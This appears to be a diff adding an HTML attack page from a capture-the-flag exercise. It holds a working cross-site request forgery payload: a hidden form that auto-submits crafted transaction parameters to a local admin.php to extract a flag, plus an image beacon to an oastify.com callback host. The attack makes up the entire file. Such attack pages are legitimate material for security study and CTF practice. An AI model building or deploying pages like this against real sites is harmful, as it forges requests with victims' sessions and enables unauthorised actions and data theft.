@@ -1,0 +1,17 @@
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Flag Extraction Fixed</title>
+  </head>
+  <body>
+      <img src="https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/attack-start-fixed-035">
+
+      <form id="attackForm" method="POST" action="http://localhost:5000/admin.php" target="_self">
+          <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions[0][amount]=1&transactions[0][country]=United States&transactions[1][amount]=1&transactions[1][country]=FLAG">
+      </form>
+
+      <script>
+          document.getElementById('attackForm').submit();
+      </script>
+  </body>
+  </html>
